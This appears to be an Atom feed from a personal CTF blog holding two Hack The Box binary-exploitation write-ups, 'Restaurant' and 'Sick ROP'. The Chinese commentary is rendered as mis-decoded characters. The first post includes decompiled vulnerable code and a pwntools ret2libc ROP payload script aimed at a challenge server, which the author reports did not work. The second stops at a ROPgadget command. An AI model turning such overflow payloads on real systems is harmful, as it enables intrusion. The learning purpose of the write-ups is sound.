<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://lookhui.github.io</id>
    <title>ililiiY â€¢ Posts by &#34;pwn&#34; tag</title>
    <link href="https://lookhui.github.io" />
    <updated>2023-12-18T04:35:55.000Z</updated>
    <category term="æ¸—é€" />
    <category term="PWN" />
    <category term="WEB" />
    <category term="mobile" />
    <category term="æ¯”èµ›" />
    <category term="HTB" />
    <category term="reverse" />
    <category term="CTF" />
    <category term="è®°å½•è´´" />
    <entry>
        <id>https://lookhui.github.io/HTB-Restauran/</id>
        <title>HTB-Restauran</title>
        <link rel="alternate" href="https://lookhui.github.io/HTB-Restauran/"/>
        <content type="html">&lt;h1 id=&#34;restauran&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#restauran&#34;&gt;#&lt;/a&gt; Restauran&lt;/h1&gt;
&lt;p&gt;ä¸€ç›´åˆ·æ¸—é€å¤šæ— èŠåœ¨ç©ç© pwn æ¥æ„Ÿå— pwnpwn çš„ä¹è¶£&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIE:      No PIE (0x400000)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;æ²¡æœ‰å¼€ stack å’Œ pie&lt;/p&gt;
&lt;p&gt;è¿è¡Œçœ‹çœ‹&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ğŸ¥¡ Welcome to Rocky Restaurant ğŸ¥¡&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;åº”è¯¥æ˜¯ä¸€ä¸ªé¤å…ç®¡ç†ç³»ç»Ÿ&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ ida64 è¿›è¡Œè°ƒè¯•&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v3; // ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v4; // er8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v5; // er9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v6; // edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v7; // ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v8; // er8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v9; // er9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v10; // rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v11; // ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v12; // er8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v13; // er9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v15; // [rsp+Ch] [rbp-4h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setup();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  color((unsigned int)&amp;amp;unk_401250, (unsigned int)&amp;quot;cyan&amp;quot;, (unsigned int)&amp;quot;bold&amp;quot;, v3, v4, v5);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  color((unsigned int)&amp;quot;\nWhat would you like?&amp;quot;, (unsigned int)&amp;quot;green&amp;quot;, v6, v7, v8, v9);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(&amp;quot;\n1. Fill my dish.\n2. Drink something\n&amp;gt; &amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&amp;amp;unk_401226, &amp;amp;v15);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( v15 == 1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fill((__int64)&amp;amp;unk_401226, (__int64)&amp;amp;v15, v10, v11, v12, v13);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( v15 != 2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      color((unsigned int)&amp;quot;\nInvalid option! Exiting..\n&amp;quot;, (unsigned int)&amp;quot;red&amp;quot;, (unsigned int)&amp;quot;bold&amp;quot;, v11, v12, v13);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      exit(261);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    drink((__int64)&amp;amp;unk_401226, (__int64)&amp;amp;v15, v10, v11, v12, v13);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯ main å‡½æ•°é‡Œé¢çš„&lt;/p&gt;
&lt;p&gt;fill&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int __fastcall fill(__int64 a1, __int64 a2, __int64 a3, int a4, int a5, int a6)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v6; // ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v7; // er8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v8; // er9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 buf; // [rsp+0h] [rbp-20h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  color(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    (unsigned int)&amp;quot;\nYou can add these ingredients to your dish:&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    (unsigned int)&amp;quot;green&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    (unsigned int)&amp;quot;bold&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a4,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a5,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a6,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0LL,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0LL,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0LL,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0LL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(::a1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  color((unsigned int)&amp;quot;You can also order something else.\n&amp;gt; &amp;quot;, (unsigned int)&amp;quot;green&amp;quot;, (unsigned int)&amp;quot;bold&amp;quot;, v6, v7, v8);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(0, &amp;amp;buf, 0x400uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return printf(&amp;quot;\nEnjoy your %s&amp;quot;, (const char *)&amp;amp;buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ¼æ´ç‚¹å¾ˆç®€å•å°±æ˜¯ ret2libc ä½†æ˜¯æˆ‘ä¸€ç›´æ‰“å°ä¸å‡ºæ ˆåœ°å€ï¼Œå¾ˆéš¾å—&lt;/p&gt;
&lt;p&gt;drink&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int __fastcall drink(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  const char *v6; // rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v8; // [rsp+Ch] [rbp-4h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v8 = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  color((unsigned int)&amp;quot;\nWhat beverage would you like?&amp;quot;, (unsigned int)&amp;quot;green&amp;quot;, a3, a4, a5, a6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(a1Water2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&amp;amp;unk_401226, &amp;amp;v8);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( v8 == 1 || v8 == 2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v6 = &amp;quot;\nEnjoy your drink!&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v6 = &amp;quot;\nInvalid option&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return puts(v6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œçš„è¯å°±æ˜¯ puts (v6 æ˜¯éœ€è¦æ³¨æ„çš„ç‚¹)&lt;/p&gt;
&lt;p&gt;å†™åˆ°äº†è¿™é‡Œå‘ç°è¡Œä¸é€š&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&amp;#x27;linux&amp;#x27;,arch=&amp;#x27;amd64&amp;#x27;,log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;quot;./restaurant&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ELF(b&amp;quot;./libc.so.6&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=process(b&amp;quot;./restaurant&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;quot;167.99.85.216&amp;quot;,32579)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts=elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got=elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x40063e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi_pop=0x4010a3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fill=0x400E4A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts)+p64(fill)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;quot;&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(str(1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;quot;&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=p.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a+=p.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;d=p.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(d)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å‘ç° pwn åŸæ¥ä¹Ÿè¿™ä¹ˆéš¾æœ‰ç‚¹ç¯å¢ƒé—®é¢˜å°± gg&lt;/p&gt;
</content>
        <category term="PWN" />
        <updated>2023-12-18T04:35:55.000Z</updated>
    </entry>
    <entry>
        <id>https://lookhui.github.io/HTB-Sick-ROP/</id>
        <title>HTB-Sick_ROP</title>
        <link rel="alternate" href="https://lookhui.github.io/HTB-Sick-ROP/"/>
        <content type="html">&lt;h1 id=&#34;sick-rop&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sick-rop&#34;&gt;#&lt;/a&gt; Sick ROP&lt;/h1&gt;
&lt;p&gt;å¸¸è§„å¥—è·¯æ£€æŸ¥&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO:    No RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIE:      No PIE (0x400000)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ strings&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;rop.asm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__bss_start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_edata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_end&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.symtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.strtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.shstrtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°è²Œä¼¼æ²¡æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„ç‚¹&lt;/p&gt;
&lt;p&gt;æœ¬åœ°è¿è¡Œè°ƒè¯•å‘ç°æˆ‘è¾“å‡ºä»€ä¹ˆä»–å°±ä¼šç…§æ ·è¾“å‡º&lt;/p&gt;
&lt;p&gt;æ˜¯é™æ€çš„è¯æˆ‘ä»¬ä½¿ç”¨ ROPgadget --binary sick_rop --ropchain&lt;/p&gt;
